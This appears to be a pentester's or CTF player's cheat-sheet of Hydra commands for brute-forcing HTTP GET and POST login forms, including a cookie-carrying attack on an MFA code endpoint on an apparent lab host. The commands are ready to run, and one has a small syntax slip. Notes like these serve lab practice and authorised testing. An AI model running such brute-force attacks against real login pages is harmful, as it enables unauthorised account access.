https://www.hackingarticles.in/a-detailed-guide-on-hydra/
##### Bruteforce HTTP-Get
```
hydra -l USER -P /usr/share/wordlists/rockyou.txt IP -s PORT http-get /PATH`
```

##### Bruteforce HTTP-Post-form
Post entire Burp Suite output for the variables
`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form "PATH:username=^USER&password=^PASS^:F=Invalid Password!"`
With cookie:
`sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form "PATH:username=^USER^&password=^PASS^:H=Cookie\: PHPSESSID=vi1l68d78tdu4c84uajqdjula4:F=fail"`

```
hydra -l jason -P list.txt 10.10.204.240 http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=l6jjj91qbp4867sesgnso2ti78; user=jason_test_account; pwd=abkr:Incorrect" -I -V
```

```
	hydra -l username -P list.txt IP_ADDR http-post-form "/PATH/VULN.PHP:PASSWORD_ARG=^PASS^:H=Cookie: COOKIE1=TESTl; COOKIE2=TEST2:INCORRECT_RET_VALUE" -I -V
```
Note: the "incorrect" must always be the last parameter
